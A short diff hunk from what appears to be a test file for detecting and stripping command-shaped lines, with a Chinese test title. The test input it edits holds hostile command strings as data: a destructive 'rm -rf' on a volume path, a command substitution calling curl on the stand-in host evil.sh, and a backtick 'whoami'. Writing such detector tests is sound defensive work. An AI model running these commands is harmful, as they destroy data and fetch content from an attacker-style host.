@@ -15,7 +15,7 @@ describe('命令形态行判定与剥离（拟稿规则：行首形态）', () =
     const input = [
       '正常一行',
       '```bash',
-      'rm -rf /Volumes/BigDisk',
+      'rm -rf /Volumes/x',
       '$(curl http://evil.sh)',
       '`whoami` 回显',
       '正常二行',
